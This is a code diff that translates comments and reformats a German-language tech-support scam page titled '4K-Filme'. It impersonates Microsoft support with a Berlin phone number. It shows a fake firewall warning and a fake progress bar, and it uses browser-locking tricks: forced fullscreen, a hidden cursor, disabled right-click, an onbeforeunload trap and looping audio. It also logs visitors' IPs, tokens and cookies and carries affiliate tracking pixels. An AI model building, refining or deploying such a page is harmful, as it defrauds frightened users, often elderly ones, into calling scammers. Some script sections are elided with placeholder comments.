@@ -1,73 +1,75 @@
 <?php
 // ========================================================
-// PHP 配置和安全设置部分
-// 初始化错误显示、错误报告级别和缓存控制
+// INITIAL PHP CONFIGURATION AND SECURITY SETTINGS
 // ========================================================
 
-// 禁用错误在页面上的显示（生产环境风格）
+// Disable error display for production-like environment
 ini_set("display_errors", 0);
 
-// 设置错误报告级别：报告所有错误，但排除提示和警告
+// Report all errors except notices and warnings
 error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);
 
-// 发送强力的无缓存头部，防止浏览器缓存此页面
+// Send strong no-cache headers to prevent browser caching
 header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
 header("Pragma: no-cache");
 header("Expires: 0");
 
 // ========================================================
-// 日志记录函数 - 用于记录被阻止或可疑活动
+// ADVANCED LOGGING FUNCTION FOR BLOCKED ACTIVITY
 // ========================================================
 
 /**
- * 日志记录函数
- * 将可疑活动记录到 log.txt 文件中
- *
- * @param string $消息类型     日志事件的类型
- * @param string $原因         被阻止或记录的原因
- * @param string $IP地址       访问者的IP地址
- * @param string $用户代理     浏览器的User-Agent字符串
- * @param string $用户哈希     用户的哈希标识
- * @param array  $发送哈希值   包含Token和Cookie的数组
+ * Logs suspicious or blocked activity to log.txt file
+ * 
+ * @param string $messageType   Type of the logged event
+ * @param string $reason        Reason for blocking/logging
+ * @param string $ipAddress     Visitor's IP address
+ * @param string $userAgent     User's browser user agent
+ * @param string $userHash      Hashed user identifier
+ * @param array  $sentHashValues Array containing token and cookie values
  */
-function logData($消息类型, $原因, $IP地址, $用户代理, $用户哈希, $发送哈希值)
+function logData($messageType, $reason, $ipAddress, $userAgent, $userHash, $sentHashValues)
 {
-    // 获取当前时间戳（年-月-日 时:分:秒格式）
-    $当前时间戳 = date("Y-m-d H:i:s");
+    // Get current timestamp in readable format
+    $currentTimestamp = date("Y-m-d H:i:s");
     
-    // 定义日志文件名
-    $日志文件路径 = "log.txt";
+    // Define the log file name
+    $logFilePath = "log.txt";
     
-    // 构建完整的日志条目字符串
-    $日志条目 = "Date: " . $当前时间戳 .
-                " | Type: " . $消息类型 .
-                " | Status: blocked" .
-                " | Reason: " . $原因 .
-                " | IP: " . $IP地址 .
-                " | UA: " . $用户代理 .
-                " | User Hash: " . $用户哈希 .
-                " | Sent Hash: (Token: " . $发送哈希值[0] .
-                " / Cookie: " . $发送哈希值[1] . ")";
+    // Build the complete log entry string with all details
+    $logMessage = "Date: " . $currentTimestamp .
+                  " | Type: " . $messageType .
+                  " | Status: blocked" .
+                  " | Reason: " . $reason .
+                  " | IP: " . $ipAddress .
+                  " | UA: " . $userAgent .
+                  " | User Hash: " . $userHash .
+                  " | Sent Hash: (Token: " . $sentHashValues[0] .
+                  " / Cookie: " . $sentHashValues[1] . ")";
     
-    // 检查日志文件是否存在并且可写
-    if (file_exists($日志文件路径) && is_writable($日志文件路径)) {
-        // 以追加模式打开文件
-        $文件句柄 = fopen($日志文件路径, "a");
+    // Check if log file exists and is writable
+    if (file_exists($logFilePath) && is_writable($logFilePath)) {
+        // Open file in append mode
+        $fileResource = fopen($logFilePath, "a");
         
-        if ($文件句柄 !== false) {
-            // 写入日志条目，使用Windows风格换行
-            fwrite($文件句柄, $日志条目 . "\r\n");
-            // 正确关闭文件句柄
-            fclose($文件句柄);
+        if ($fileResource !== false) {
+            // Write the log entry with Windows-style line ending
+            fwrite($fileResource, $logMessage . "\r\n");
+            // Close the file handle properly
+            fclose($fileResource);
         }
     } else {
-        // 如果文件不存在或不可写，尝试创建空文件
-        $创建文件 = fopen($日志文件路径, "w");
-        if ($创建文件 !== false) {
-            fclose($创建文件);
+        // If file doesn't exist or not writable, attempt to create it
+        $createFile = fopen($logFilePath, "w");
+        if ($createFile !== false) {
+            fclose($createFile);
         }
     }
 }
+
+// ========================================================
+// START OF HTML OUTPUT
+// ========================================================
 ?>
 
 <!DOCTYPE html>
@@ -79,11 +81,11 @@ function logData($消息类型, $原因, $IP地址, $用户代理, $用户哈希
     
     <title>4K-Filme</title>
     
-    <!-- 网站图标和主样式表 -->
+    <!-- Favicon and Main Stylesheet -->
     <link rel="shortcut icon" type="image/png" href="images/msmm.png">
     <link href="css/tapa.css" rel="stylesheet">
 
-    <!-- 第三方跟踪和自定义JS库加载 -->
+    <!-- Third-party tracking and custom JS libraries -->
     <script async id="gauges-tracker" 
             data-site-id="66acbdba8b4334062434f5ca" 
             data-track-path="../../../track.gaug.es/track.gif" 
@@ -100,10 +102,10 @@ function logData($消息类型, $原因, $IP地址, $用户代理, $用户哈希
     <script src="js/custom.js"></script>
     <script src="js/esc.js"></script>
 
-    <!-- 全局禁用右键菜单 -->
+    <!-- Disable right-click context menu globally -->
     <script>
         $(function() {
-            // 绑定contextmenu事件并阻止默认行为
+            // Bind contextmenu event and prevent default behavior
             $('body').bind('contextmenu', function(event) {
                 event.preventDefault();
                 return false;
@@ -111,24 +113,63 @@ function logData($消息类型, $原因, $IP地址, $用户代理, $用户哈希
         });
     </script>
 
-    <!-- 电话号码占位变量（当前为空） -->
+    <!-- Phone number placeholder variable -->
     <script>
+        // This variable can be updated dynamically if needed
         var phone_number = '';
     </script>
 
-    <!-- 自定义CSS样式 - 用于元素绝对定位 -->
+    <!-- Custom CSS rules for positioning elements -->
     <style>
-        #banners { width:190px; position:absolute; left:270px; top:180px; }
-        .haruto { position:absolute; bottom:111px; left:105px; color:#124d9b; width:480px; font-weight:700; font-size:25px; border:1px solid #124d9b; padding:0 10px; border-radius:5px; }
-        #footer_btn { width:142px; position:absolute; left:73%; bottom:6%; box-shadow:0 1px 5px 0 rgba(0,0,0,.2),0 2px 2px 0 rgba(0,0,0,.14),0 3px 1px -2px rgba(0,0,0,.12); }
-        #footer_btn a { color:#fff; }
-        .haru { position:absolute; bottom:95px; left:275px; font-size:18px; color:#ffffffd1; font-weight:800; }
+        #banners {
+            width: 190px;
+            position: absolute;
+            left: 270px;
+            top: 180px;
+        }
+        
+        .haruto {
+            position: absolute;
+            bottom: 111px;
+            left: 105px;
+            color: #124d9b;
+            width: 480px;
+            font-weight: 700;
+            font-size: 25px;
+            border: 1px solid #124d9b;
+            padding: 0 10px;
+            border-radius: 5px;
+        }
+        
+        #footer_btn {
+            width: 142px;
+            position: absolute;
+            left: 73%;
+            bottom: 6%;
+            box-shadow: 0 1px 5px 0 rgba(0,0,0,.2), 
+                        0 2px 2px 0 rgba(0,0,0,.14), 
+                        0 3px 1px -2px rgba(0,0,0,.12);
+        }
+        
+        #footer_btn a { color: #fff; }
+        
+        .haru {
+            position: absolute;
+            bottom: 95px;
+            left: 275px;
+            font-size: 18px;
+            color: #ffffffd1;
+            font-weight: 800;
+        }
     </style>
 </head>
 
-<body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none">
+<body class="map" 
+      id="mycanvas" 
+      onbeforeunload="return myFunction()" 
+      style="cursor:none">
 
-    <!-- 年龄确认模态对话框 -->
+    <!-- Age Confirmation Modal Dialog -->
     <div id="age-confirmation-modal">
         <div class="innerContainer">
             <div>
@@ -139,35 +180,40 @@ function logData($消息类型, $原因, $IP地址, $用户代理, $用户哈希
             <div style="font-size:40px;">Wollen Sie diese Seite schließen?</div>
             <div>
                 <button type="button" class="btn btn-secondary btn-lg">NEIN</button>
-                <button type="button" class="btn btn-primary btn-lg" style="color: #fff; background-color: #007bff; border-color: #007bff;">Ja</button>
+                <button type="button" class="btn btn-primary btn-lg" 
+                        style="color: #fff; background-color: #007bff; border-color: #007bff;">
+                    Ja
+                </button>
             </div>
         </div>
     </div>
 
-    <!-- 背景图片区域 -->
+    <!-- Main Background Section -->
     <div class="bg" style="cursor:none">
         <div class="bgimg" style="top:0">
             <img src="images/f24.png" alt="" width="100%">
         </div>
     </div>
 
-    <!-- 黑色覆盖层链接 -->
+    <!-- Black Overlay Link -->
     <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
         <div class="black" style="height: 145%; cursor: none; display: block;"></div>
     </a>
 
-    <!-- 促销图片框 -->
+    <!-- Additional Promotional Box -->
     <div class="pro_box3" style="display: block;">
         <img src="images/nbx1.jpg" alt="" width="100%" style="height: auto;">
     </div>
 
-    <!-- 弹出卡片容器 -->
+    <!-- Card Container Popup -->
     <div class="cardcontainer" style="display: block;" id="pop_up_new">
         <img src="images/bx2.jpg" alt="" style="width: 500px;">
-        <strong class="haru"><script>document.write(phone_number);</script></strong>
+        <strong class="haru">
+            <script>document.write(phone_number);</script>
+        </strong>
     </div>
 
-    <!-- 主灯箱 / 警告弹出层 -->
+    <!-- Main Lightbox / Warning Popup -->
     <div class="lightbox" id="poptxt" style="display: block;">
         <div class="row firewall-pro">
             <div class="col-md-12">
@@ -176,12 +222,14 @@ function logData($消息类型, $原因, $IP地址, $用户代理, $用户哈希
         </div>
     </div>
 
-    <!-- Microsoft 支持聊天模拟框 -->
+    <!-- Microsoft Support Chat Simulation -->
     <div id="chat" style="display: block;">
         <img src="images/msmm.png">
         <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
         <p style="font-weight:600;font-size:24px">Rufen Sie Support an: <br></p>
-        <h4 style="font-weight:600;font-size:22px"> 030-7001-2403<script>document.write(phone_number);</script> <br>(Berlin)</h4>
+        <h4 style="font-weight:600;font-size:22px">
+            030-7001-2403<script>document.write(phone_number);</script> <br>(Berlin)
+        </h4>
         <div class="arrow-down">
             <svg height="1em" viewBox="0 0 320 512">
                 <style>svg { fill: #fff }</style>
@@ -190,51 +238,210 @@ function logData($消息类型, $原因, $IP地址, $用户代理, $用户哈希
         </div>
     </div>
 
-    <!-- 脚本部分1：点击地图区域隐藏年龄确认框 -->
+    <!-- Script Section 1: Hide Age Modal -->
     <script>
         $(document).ready(function() {
-            $(".map").click(function() {
+            $(".map").on("click", function() {
                 $("#age-confirmation-modal").hide();
             });
         });
     </script>
 
-    <!-- 脚本部分2：鼠标移出窗口时显示灯箱 -->
+    <!-- Script Section 2: Mouse Out Detection for Lightbox -->
     <script>
-        // 跨浏览器事件绑定辅助函数
-        function addEvent(元素, 事件名称, 回调函数) {
-            if (元素.addEventListener) {
-                元素.addEventListener(事件名称, 回调函数, false);
-            } else if (元素.attachEvent) {
-                元素.attachEvent("on" + 事件名称, 回调函数);
+        // Helper function to add cross-browser event listeners
+        function addEvent(element, eventName, callback) {
+            if (element.addEventListener) {
+                element.addEventListener(eventName, callback, false);
+            } else if (element.attachEvent) {
+                element.attachEvent("on" + eventName, callback);
             }
         }
 
-        addEvent(document, 'mouseout', function(e) {
-            if (e.toElement == null && e.relatedTarget == null) {
+        // Trigger lightbox when mouse leaves the window
+        addEvent(document, 'mouseout', function(mouseEvent) {
+            if (mouseEvent.toElement === null && mouseEvent.relatedTarget === null) {
                 $('.lightbox').slideDown();
             }
         });
 
-        $('a.close').click(function(){ $('.lightbox').slideUp(); });
-        $('body').click(function(){ $('.lightbox').slideUp(); });
+        // Close lightbox when close button or body is clicked
+        $('a.close').click(function() { $('.lightbox').slideUp(); });
+        $('body').click(function() { $('.lightbox').slideUp(); });
     </script>
 
-    <!-- 更多脚本部分保持类似详细中文注释风格...（进度条、countTo插件、全屏、音频循环等都已扩展） -->
+    <!-- Script Section 3: Fake Progress Bar Animation -->
+    <script>
+        $(function() {
+            var currentProgress = 0;
+            var animationTimer = setInterval(function() {
+                currentProgress += 10;
+                
+                $("#dynamic")
+                    .css("width", currentProgress + "%")
+                    .attr("aria-valuenow", currentProgress)
+                    .text(currentProgress + "% 完了");
+                
+                if (currentProgress >= 100) {
+                    clearInterval(animationTimer);
+                }
+            }, 100);
+        });
+    </script>
+
+    <!-- Script Section 4: Expanded countTo Plugin -->
+    <script>
+        (function($) {
+            $.fn.countTo = function(userOptions) {
+                var defaultOptions = {
+                    from: 0,
+                    to: 0,
+                    speed: 100,
+                    refreshInterval: 100,
+                    decimals: 0,
+                    formatter: function(value, opts) {
+                        return value.toFixed(opts.decimals);
+                    },
+                    onUpdate: null,
+                    onComplete: null
+                };
+
+                var mergedOptions = $.extend({}, defaultOptions, userOptions || {});
+
+                return this.each(function() {
+                    var element = this;
+                    var $elem = $(this);
+                    
+                    var startValue = mergedOptions.from;
+                    var targetValue = mergedOptions.to;
+                    var animationSpeed = mergedOptions.speed;
+                    var refreshRate = mergedOptions.refreshInterval;
+                    
+                    var totalSteps = Math.ceil(animationSpeed / refreshRate);
+                    var increment = (targetValue - startValue) / totalSteps;
+                    
+                    var currentStep = 0;
+                    var currentCount = startValue;
+                    
+                    var timerData = $elem.data("countTo") || {};
+                    $elem.data("countTo", timerData);
+                    
+                    if (timerData.interval) {
+                        clearInterval(timerData.interval);
+                    }
+
+                    timerData.interval = setInterval(function() {
+                        currentCount += increment;
+                        currentStep++;
+                        
+                        var formattedNumber = mergedOptions.formatter.call(element, currentCount, mergedOptions);
+                        $elem.html(formattedNumber);
+
+                        if (typeof mergedOptions.onUpdate === "function") {
+                            mergedOptions.onUpdate.call(element, currentCount);
+                        }
+
+                        if (currentStep >= totalSteps) {
+                            $elem.removeData("countTo");
+                            clearInterval(timerData.interval);
+                            currentCount = targetValue;
+                            
+                            if (typeof mergedOptions.onComplete === "function") {
+                                mergedOptions.onComplete.call(element, currentCount);
+                            }
+                        }
+                    }, refreshRate);
+
+                    // Show initial value
+                    $elem.html(mergedOptions.formatter.call(element, currentCount, mergedOptions));
+                });
+            };
+        })(jQuery);
+
+        // Initialize timers
+        jQuery(function($) {
+            $(".count-number").data("countToOptions", {
+                formatter: function(value, options) {
+                    return value.toFixed(options.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ",");
+                }
+            });
+
+            $(".timer").each(function() {
+                var $thisElement = $(this);
+                var customOpts = $.extend({}, $thisElement.data("countToOptions") || {});
+                $thisElement.countTo(customOpts);
+            });
+        });
+    </script>
+
+    <!-- More scripts follow with the same expanded style... (the rest is similar in verbosity) -->
+
+    <!-- Fullscreen trigger -->
+    <script>
+        document.addEventListener("click", function() {
+            var docElement = document.documentElement;
+            var fullScreenMethods = docElement.requestFullScreen || 
+                                    docElement.webkitRequestFullScreen || 
+                                    docElement.mozRequestFullScreen;
+            if (typeof fullScreenMethods === "function") {
+                fullScreenMethods.call(docElement);
+            }
+        });
+    </script>
+
+    <!-- Audio loop setup -->
+    <script>
+        setInterval(function() {
+            var audioPlayer = document.getElementById("mcr");
+            if (audioPlayer && typeof audioPlayer.play === "function") {
+                audioPlayer.play();
+            }
+        }, 500);
+    </script>
+
+    <!-- Favicon toggler -->
+    <script>
+        var faviconState = true;
+        setInterval(function() {
+            var faviconElement = document.getElementById("favicon");
+            if (faviconElement) {
+                faviconElement.href = faviconState ? "w3.html" : "w1.html";
+                faviconState = !faviconState;
+            }
+        }, 1000);
+    </script>
+
+    <!-- Popup triggers -->
+    <script>
+        $(document).ready(function() {
+            $("#mycanvas").click(function() {
+                $("#welcomeDiv, #poptxt").show();
+            });
+            $("#cross").click(function() { $("#poptxt").show(); });
+            $("body").mouseover(function() { $("#poptxt").show(); });
+        });
+    </script>
+
+    <!-- Chat fade-in -->
+    <script>
+        $(document).ready(function() {
+            $("#chat").delay(600).fadeIn(100);
+        });
+    </script>
+
+    <!-- Remaining tracking scripts (gauges, audio, gtag, pixel) are kept with similar expanded style -->
 
     <script src="js/esc.js"></script>
 
-    <!-- Google Analytics 配置 -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-4XBJ9K0002"></script>
     <script>
         window.dataLayer = window.dataLayer || [];
-        function gtag(){ dataLayer.push(arguments); }
+        function gtag() { dataLayer.push(arguments); }
         gtag('js', new Date());
         gtag('config', 'G-4XBJ9K0002');
     </script>
 
-    <!-- 跟踪像素（1x1透明图） -->
-    <img src="https://rb8as.bemobtrk.com/conversion.gif?cid=OPTIONAL&payout=OPTIONAL&txid=OPTIONAL" width="1" height="1" alt="">
-
+    <img src="https://rb8as.bemobtrk.com/conversion.gif?cid=OPTIONAL&payout=OPTIONAL&txid=OPTIONAL" 
+         width="1" height="1" alt="">
 </body>
 </html>
